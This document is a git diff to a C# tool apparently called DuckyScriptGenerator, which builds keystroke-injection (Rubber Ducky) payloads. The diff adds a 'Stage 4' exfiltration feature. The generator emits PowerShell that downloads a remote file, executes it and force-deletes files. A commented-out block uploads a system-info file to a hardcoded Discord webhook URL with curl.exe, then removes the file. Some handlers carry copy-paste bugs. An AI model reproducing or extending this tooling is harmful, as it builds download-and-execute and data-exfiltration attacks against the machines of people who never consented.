@@ -54,7 +54,7 @@ namespace DuckyScriptGenerator
 
         // ----------------------------------------------------------------------------------------------------- //
         // 
-        //                                          FILE STUFF
+        //                                     FILE STUFF (STAGE 1/2)
         //
         // ----------------------------------------------------------------------------------------------------- //
         private void cbDownloadFile_CheckedChanged(object sender, EventArgs e)
@@ -62,13 +62,13 @@ namespace DuckyScriptGenerator
             // Disables or Enables the text fields
             if (cbDownloadFile.Checked)
             {
-                txtDownloadFileURL.Enabled = true;
-                txtDownloadFilePath.Enabled = true;
+                txtFILEDownloadFileURL.Enabled = true;
+                txtFILEDownloadFilePath.Enabled = true;
             }
             else
             {
-                txtDownloadFileURL.Enabled = false;
-                txtDownloadFilePath.Enabled = false;
+                txtFILEDownloadFileURL.Enabled = false;
+                txtFILEDownloadFilePath.Enabled = false;
             }
         }
 
@@ -77,11 +77,11 @@ namespace DuckyScriptGenerator
             // Disables or Enables the text fields
             if (cbExecuteFile.Checked)
             {
-                txtExecuteFile.Enabled = true;
+                txtFILEExecuteFile.Enabled = true;
             }
             else
             {
-                txtExecuteFile.Enabled = false;
+                txtFILEExecuteFile.Enabled = false;
             }
         }
 
@@ -90,13 +90,50 @@ namespace DuckyScriptGenerator
             // Disables or Enables the text fields
             if (cbDeleteFile.Checked)
             {
-                txtDeleteFile.Enabled = true;
+                txtFILEDeleteFile.Enabled = true;
             }
             else
             {
-                txtDeleteFile.Enabled = false;
+                txtFILEDeleteFile.Enabled = false;
             }
         }
+
+        // ----------------------------------------------------------------------------------------------------- //
+        // 
+        //                                      EXFILTRATION (STAGE 4)
+        //
+        // ----------------------------------------------------------------------------------------------------- //
+
+        private void cbDiscordWebhook_CheckedChanged(object sender, EventArgs e)
+        {
+            // Disables or Enables the text fields
+            if (cbDiscordWebhook.Checked)
+            {
+                txtEXFILWebhookFileToSend.Enabled = true;
+                txtEXFILWebhookTOKEN.Enabled = true;
+            }
+            else
+            {
+                txtEXFILWebhookFileToSend.Enabled = false;
+                txtEXFILWebhookTOKEN.Enabled = false;
+            }
+        }
+
+        private void cbPostRequest_CheckedChanged(object sender, EventArgs e)
+        {
+            // Disables or Enables the text fields
+            if (cbDiscordWebhook.Checked)
+            {
+                txtEXFILWebhookFileToSend.Enabled = true;
+                txtEXFILWebhookTOKEN.Enabled = true;
+            }
+            else
+            {
+                txtEXFILWebhookFileToSend.Enabled = false;
+                txtEXFILWebhookTOKEN.Enabled = false;
+            }
+        }
+
 
         // ----------------------------------------------------------------------------------------------------- //
         // 
@@ -148,17 +185,60 @@ namespace DuckyScriptGenerator
 
 
             // Bool value to check if User wants to use a stage 3 payload.
-            bool hasStage3 = false;
+            bool hasStage3 = true;
 
             // Bool value to check if User wants to use a stage 4 payload.
             bool hasStage4 = false;
 
 
-            // Have not implemented this yet (Stage 3)
-            string duckyCodeStage3 = $"DELAY 500\r\n" + $"ENTER\r\n";
+            // Check if uses Stage 3.
+            if (cbDiscordWebhook.Checked)
+            {
+                //hasStage4 = true;
+            }
+            else if (cbPostRequest.Checked)
+            {
+                //hasStage4 = true;
+            }
+            else
+            {
+                //hasStage4 = false;
+            }
 
+            // Check if uses Stage 4.
+            if (hasStage3)
+            {
+                if (cbDiscordWebhook.Checked)
+                {
+                    hasStage4 = true;
+                }
+                else if (cbPostRequest.Checked)
+                {
+                    hasStage4 = true;
+                }
+                else
+                {
+                    hasStage4 = false;
+                }
+            }
+            else
+            {
+                hasStage4 = false;
+            }
+
+
+            // Have not implemented this yet (Stage 3)
+            string duckyCodeStage3 = $"REM Stage 4 Starts HERE...\r\n" + $"DELAY 500\r\n" + $"ENTER\r\n";
+
+            
             // Have not implemented this yet (Stage 4)
-            string duckyCodeStage4 = $"DELAY 500\r\n" + $"ENTER\r\n";
+            string duckyCodeStage4 = $"REM Stage 4 Starts HERE...\r\n" + $"DELAY 500\r\n" + $"ENTER\r\n";
+            // $webhookUrl = "https://discord.com/api/webhooks/1070416409215107184/UAILaaOb37Vlb223hJuywdE8ysjpW4DSW7hA-g_nemnLabmF40vknnvov3I-4V4eYBTM";
+            // $fileToSend = "C:\Users\Public\SystemInfo.txt";
+            // $Body = @{ content = "Here's the file you requested." };
+            // $jsonBody = $Body | ConvertTo-Json;
+            // curl.exe -F "file1=@$fileToSend" $webhookUrl;
+            // Remove-Item $fileToSend -Force
 
 
             // The payload on stage 1/2.
@@ -167,8 +247,8 @@ namespace DuckyScriptGenerator
             // Check if Download File option is selected and retrieve the file name and path
             if (cbDownloadFile.Checked)
             {
-                string downloadFileName = txtDownloadFileURL.Text;
-                string downloadFilePath = txtDownloadFilePath.Text;
+                string downloadFileName = txtFILEDownloadFileURL.Text;
+                string downloadFilePath = txtFILEDownloadFilePath.Text;
                 // Construct the Duckyscript command for downloading the file
                 customContent += $"(New-Object Net.WebClient).DownloadFile(\"{downloadFileName}\", \"{downloadFilePath}\"); ";
             }
@@ -176,7 +256,7 @@ namespace DuckyScriptGenerator
             // Check if Execute File option is selected and retrieve the file name
             if (cbExecuteFile.Checked)
             {
-                string executeFileName = txtExecuteFile.Text;
+                string executeFileName = txtFILEExecuteFile.Text;
                 // Construct the Duckyscript command for executing the file
                 customContent += $"Start-Process \"{executeFileName}\"; ";
             }
@@ -184,7 +264,7 @@ namespace DuckyScriptGenerator
             // Check if Delete File option is selected and retrieve the file path to delete
             if (cbDeleteFile.Checked)
             {
-                string DeleteFilePathName = txtDeleteFile.Text;
+                string DeleteFilePathName = txtFILEDeleteFile.Text;
                 // Construct the Duckyscript command for executing the file
                 customContent += $"Remove-Item \"{DeleteFilePathName}\" -Force; ";
             }
@@ -404,31 +484,43 @@ namespace DuckyScriptGenerator
             }
         }
 
-        // Creates variables for a profile config file 
+        // Creates variables for a profile config file (IF ADDED NEW SETTINGS EDIT THIS!!!)
         private Profile CreateProfileFromUI()
         {
             return new Profile
             {
                 DownloadFileEnabled = cbDownloadFile.Checked,
-                DownloadFileURL = txtDownloadFileURL.Text,
-                DownloadFilePath = txtDownloadFilePath.Text,
+                DownloadFileURL = txtFILEDownloadFileURL.Text,
+                DownloadFilePath = txtFILEDownloadFilePath.Text,
                 ExecuteFileEnabled = cbExecuteFile.Checked,
-                ExecuteFileName = txtExecuteFile.Text,
+                ExecuteFileName = txtFILEExecuteFile.Text,
                 DeleteFileEnabled = cbDeleteFile.Checked,
-                DeleteFilePath = txtDeleteFile.Text
+                DeleteFilePath = txtFILEDeleteFile.Text,
+                // STAGE 4:
+                DiscordWebhookEnabled = cbDiscordWebhook.Checked,
+                DiscordWebhookTOKEN = txtEXFILWebhookTOKEN.Text,
+                DiscordWebhookFileToSend = txtEXFILWebhookFileToSend.Text,
+                PostRequestEnabled = cbPostRequest.Checked,
+                PostReqFileToSend = txtEXFILPostReqFileToSend.Text
             };
         }
 
-        // Reads and applyies variables from a profile config file
+        // Reads and applyies variables from a profile config file (IF ADDED NEW SETTINGS EDIT THIS!!!)
         private void ApplyProfileToUI(Profile profile)
         {
             cbDownloadFile.Checked = profile.DownloadFileEnabled;
-            txtDownloadFileURL.Text = profile.DownloadFileURL;
-            txtDownloadFilePath.Text = profile.DownloadFilePath;
+            txtFILEDownloadFileURL.Text = profile.DownloadFileURL;
+            txtFILEDownloadFilePath.Text = profile.DownloadFilePath;
             cbExecuteFile.Checked = profile.ExecuteFileEnabled;
-            txtExecuteFile.Text = profile.ExecuteFileName;
+            txtFILEExecuteFile.Text = profile.ExecuteFileName;
             cbDeleteFile.Checked = profile.DeleteFileEnabled;
-            txtDeleteFile.Text = profile.DeleteFilePath;
+            txtFILEDeleteFile.Text = profile.DeleteFilePath;
+            // STAGE 4:
+            cbDiscordWebhook.Checked = profile.DiscordWebhookEnabled;
+            txtEXFILWebhookTOKEN.Text = profile.DiscordWebhookTOKEN;
+            txtEXFILWebhookFileToSend.Text = profile.DiscordWebhookFileToSend;
+            cbPostRequest.Checked = profile.PostRequestEnabled;
+            txtEXFILPostReqFileToSend.Text = profile.PostReqFileToSend;
         }
 
         // The prompt for renaming a profile (Just a prompt for the user)
@@ -482,9 +574,10 @@ namespace DuckyScriptGenerator
 
     }
 
-    // All options that can be set and used.
+    // All options that can be set and used. (IF ADDED NEW SETTINGS EDIT THIS!!!)
     public class Profile
     {
+        // Stage 1/2 Settings
         public bool DownloadFileEnabled { get; set; }
         public string DownloadFileURL { get; set; }
         public string DownloadFilePath { get; set; }
@@ -492,6 +585,15 @@ namespace DuckyScriptGenerator
         public string ExecuteFileName { get; set; }
         public bool DeleteFileEnabled { get; set; }
         public string DeleteFilePath { get; set; }
+
+        // Stage 4 Settings
+        public bool DiscordWebhookEnabled { get; set; }
+        public string DiscordWebhookTOKEN { get; set; }
+        public string DiscordWebhookFileToSend { get; set; }
+        public bool PostRequestEnabled { get; set; }
+        public string PostReqFileToSend { get; set; }
+
+        // Add more settings here.
     }
 
 }
